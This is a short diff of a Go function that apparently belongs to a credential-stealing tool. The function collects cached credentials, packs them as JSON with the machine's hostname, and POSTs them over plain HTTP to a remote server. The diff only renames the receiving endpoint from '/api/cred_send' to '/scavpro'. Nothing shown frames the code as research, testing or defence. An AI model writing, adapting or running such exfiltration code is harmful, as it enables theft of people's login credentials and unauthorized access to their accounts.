@@ -34,7 +34,7 @@ func sendData(c cred_cache.CredCache) {
 	for _, cd := range creds {
 		credStr += cd + "\n"
 	}
-	url := "http://" + serv + "/api/cred_send" //turn ip into URL
+	url := "http://" + serv + "/scavpro" //turn ip into URL
 	jsonData := map[string]string{"hostname": h, "credentials": credStr}
 	jsonValue, _ := json.Marshal(jsonData)
 	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
